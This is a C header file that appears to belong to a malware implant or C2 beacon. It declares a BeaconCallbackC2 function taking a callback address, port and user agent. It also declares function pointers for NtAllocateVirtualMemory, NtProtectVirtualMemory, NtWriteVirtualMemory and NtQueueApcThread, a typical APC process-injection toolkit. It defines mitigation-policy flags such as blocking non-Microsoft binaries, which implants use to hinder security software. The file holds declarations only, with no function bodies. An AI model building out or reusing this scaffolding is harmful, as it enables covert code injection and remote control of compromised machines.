#define DATA_CMD_OUT 0x2000
#define DATA_CMD_PRO 0x3000

#define PROC_THREAD_ATTRIBUTE_NUMBER    0x0000FFFF
#define PROC_THREAD_ATTRIBUTE_THREAD    0x00010000
#define PROC_THREAD_ATTRIBUTE_INPUT     0x00020000
#define PROC_THREAD_ATTRIBUTE_ADDITIVE  0x00040000

#define PROCESS_CREATION_MITIGATION_POLICY_IMAGE_LOAD_NO_LOW_LABEL_ALWAYS_ON      (0x00000001ULL << 56)
#define PROCESS_CREATION_MITIGATION_POLICY_IMAGE_LOAD_NO_REMOTE_ALWAYS_ON         (0x00000001ULL << 52)
#define PROCESS_CREATION_MITIGATION_POLICY_FONT_DISABLE_ALWAYS_ON                 (0x00000001ULL << 48)
#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON (0x00000001ULL << 44)
#define PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON        (0x00000001ULL << 36)

#define ProcThreadAttributeValue(Number, Thread, Input, Additive) \
                                (((Number) & PROC_THREAD_ATTRIBUTE_NUMBER) | \
                                ((Thread != FALSE) ? PROC_THREAD_ATTRIBUTE_THREAD : 0) | \
                                ((Input != FALSE) ? PROC_THREAD_ATTRIBUTE_INPUT : 0) | \
                                ((Additive != FALSE) ? PROC_THREAD_ATTRIBUTE_ADDITIVE : 0))

#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY ProcThreadAttributeValue(7, FALSE, TRUE, FALSE)

typedef struct _STARTUPINFOEXA {
  STARTUPINFOA                 StartupInfo;
  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;
} STARTUPINFOEXA, *LPSTARTUPINFOEXA;

typedef void (WINAPI * RtlGetVersion_) (OSVERSIONINFOEXW *);

LPCWSTR* BeaconCallbackC2(
    LPCSTR CallbackAddress,
    INT CallbackPort,
    LPCSTR UserAgent,
    DWORD *OpCode,
    LPCSTR SendBuffer,
    DWORD SendOpCode,
    DWORD SendBufferSize
);

NTSTATUS(*NtAllocateVirtualMemory)(
    HANDLE ProcessHandle, 
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

NTSTATUS(*NtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T NumberOfBytesToProtect,
    ULONG NewAccessProtection,
    PULONG OldAccessProtection
);

NTSTATUS(*NtWriteVirtualMemory)(
    HANDLE hProcess, 
    PVOID lpBaseAddress, 
    PVOID lpBuffer, 
    SIZE_T NumberOfBytesToRead, 
    PSIZE_T NumberOfBytesRead
);

NTSTATUS(*NtQueueApcThread)(
    HANDLE ThreadHandle,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID NormalContext,
    PVOID SystemArgument1,
    PVOID SystemArgument2 
);